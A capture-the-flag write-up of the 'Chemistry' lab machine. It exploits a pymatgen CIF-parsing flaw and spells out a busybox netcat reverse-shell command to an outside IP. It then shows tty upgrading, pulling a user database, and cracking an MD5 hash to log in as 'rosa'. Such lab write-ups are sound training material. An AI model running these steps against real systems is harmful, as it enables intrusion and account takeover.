Hi everyone and welcome in my new write-up on the Chemistry box.

So let's start by making a quick scan:

<img width="846" alt="Screenshot 2024-10-29 at 18 40 23" src="https://github.com/user-attachments/assets/b7978e21-c9cd-4db0-9825-0c267e198795">

We can see that we have two open ports: 22 and 5000.
Let's get more info:

<img width="840" alt="Screenshot 2024-10-29 at 18 44 52" src="https://github.com/user-attachments/assets/829bd780-010f-4e3a-9e68-636a5f7d969b">

Ok so it seems there is a website running on the port 5000.
Let's investigate it like inspectors hehe.

<img width="1283" alt="Screenshot 2024-10-29 at 18 46 40" src="https://github.com/user-attachments/assets/866724fe-f5b4-4794-8841-ba3b45ba4ba8">

This is just a basic application that analyzes a CIF file that we can upload.
First we need to register to see this functionality.

<img width="1101" alt="Screenshot 2024-10-29 at 18 49 09" src="https://github.com/user-attachments/assets/75dd9564-e574-472c-b8bd-2ac42f9cec17">

So they give us a file example to show us what a cif file looks like and I have to admit it's a little strange. Never seen that kind of file before. But we take it, we learn a new type of file yeahhh.

After searching around (dir fuzzing and trying to bypass the upload functionality to upload a php file), I wanted to see if there was a known vulnerability about cif files. And yes I was right there is a github repo just for that.
Link: https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Let's take a look at the PoC that seems to be our ticket to get a foothold on the server:

<img width="1007" alt="Screenshot 2024-10-29 at 18 57 58" src="https://github.com/user-attachments/assets/b399c195-b00a-404f-a2c3-d2d1b9e6d0a7">

So if we replace the "touch pwned" by any command it should work too.

Let's try to make a reverse shell. I replace the command by "busybox nc 10.10.14.129 4444 -e sh" as it seems to be the only shell that works on the system after trying the usual ones.

This is what the exploit looks like:

<img width="1100" alt="Screenshot 2024-10-29 at 19 05 27" src="https://github.com/user-attachments/assets/f64d08c5-12c8-4668-b61c-559f454dec36">
Let's upload it and see if that worked.

<img width="612" alt="Screenshot 2024-10-29 at 19 08 03" src="https://github.com/user-attachments/assets/254c7de3-a971-4512-8cd7-3bddf1fa3d01">

Yeah we successully got our rev shell.
We have a very poor shell, I upgraded it with the usual tty commands:
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z;stty raw -echo;
export TERM=xterm

Ok so now that we have a nice shell we can hack ! Uhhhhh work I mean ;)

After checking the home directory it seems that we need to find a way to get to user rosa first.
So we need to find her creds somwhere in the server. My experience tells me to always check the DB first!

Found something interesting in the instance directory:

<img width="1071" alt="Screenshot 2024-10-29 at 19 21 45" src="https://github.com/user-attachments/assets/e5b15e16-8b3f-4d6a-95cb-ff6ce1bfa66d">

Ok so we literally have the db that stores each user that creates an account:

<img width="1089" alt="Screenshot 2024-10-29 at 19 23 00" src="https://github.com/user-attachments/assets/57eec8b0-8bf4-430f-863c-7bde581bd5d2">

At first it looks like a big mess but if look closer we can disntiguish each user associated with it's password hashed.
Let's search for rosa:

<img width="1078" alt="Screenshot 2024-10-29 at 19 27 20" src="https://github.com/user-attachments/assets/418b9417-c3e1-4d9a-a31d-caf13ad83820">

I copied the interesting part of the file locally and greped for rosa and I got her hash.
It's MD5, I usesd crackstation to crack it:

<img width="1223" alt="Screenshot 2024-10-29 at 19 30 44" src="https://github.com/user-attachments/assets/adc37889-f870-4274-a4b4-dcf7e51a9ab8">

Ok now we have everything to log into rosa.
I prefer to do it in ssh it's prettier uwu.

<img width="645" alt="Screenshot 2024-10-29 at 19 34 20" src="https://github.com/user-attachments/assets/b568b5a2-8b45-49ea-a36c-cc1367ffe9b5">

We can grab our usr.txt flag now !
